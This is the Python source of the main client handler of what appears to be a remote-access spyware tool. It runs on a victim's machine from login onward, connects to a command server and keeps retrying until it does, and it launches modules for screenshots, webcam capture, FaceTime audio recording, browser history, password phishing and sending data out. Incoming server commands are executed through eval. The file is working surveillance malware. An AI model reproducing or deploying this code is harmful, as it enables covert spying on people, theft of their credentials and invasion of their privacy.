"""
The main handler that runs on the target side.
Is started upon user logging in and stays running until they log out/shut down their machine.
Handles connecting to the admin, receiving commands and starting up all modules
"""
import socket
import threading
import time
import json

from send_to_server import send_data
from launch_agent_factory import delete_expired_launch_agents
import global_variables

#---------- modules ----------#
import screenshot
import webcam
from audio import audio_main
import browser_history
import usage_intervals
import phish_password
import jetplane
import uninstall
#-----------------------------#

host = "127.0.0.1"   
port = 7584                   # The same port as used by the server

import os, subprocess

class RunModule(threading.Thread):
    def __init__(self, options):
        threading.Thread.__init__(self)
        self.options = options

    def run(self):
        module = self.options['module']
        eval(module+f".run({self.options})")
        

#Connect to the server. Keep trying until a connection is established
def connect_to_server():
    global host
    global port
    global_variables.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while global_variables.serverSocket.connect_ex((host, port)) != 0:
        global_variables.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        time.sleep(1)

    global_variables.isConnectedToServer = True

def main():

    connect_to_server()
    #Start thread that sends data collected from target's machine to the server
    dataSendThread = threading.Thread(target=send_data)
    dataSendThread.daemon = True
    dataSendThread.start()

    #Start thread that deletes expired launch agents
    lauchAgentCleanupThread = threading.Thread(target=delete_expired_launch_agents)
    lauchAgentCleanupThread.daemon = True
    lauchAgentCleanupThread.start()

    #Start facetime audio recording thread
    audioRecordingThread = threading.Thread(target=audio_main)
    audioRecordingThread.daemon = True
    audioRecordingThread.start()

    #Request handler
    while True:
        try:
            data = global_variables.serverSocket.recv(1024)
            if not data: #Connection closed by server
                global_variables.isConnectedToServer = False
                global_variables.serverSocket.close()
                connect_to_server()
            else:
                options = json.loads(str(data.decode("utf-8")))
                print(options)
                runModule = RunModule(options)
                runModule.daemon = True
                runModule.start()
        except Exception:
            global_variables.isConnectedToServer = False
            global_variables.serverSocket.close()
            connect_to_server()

main()
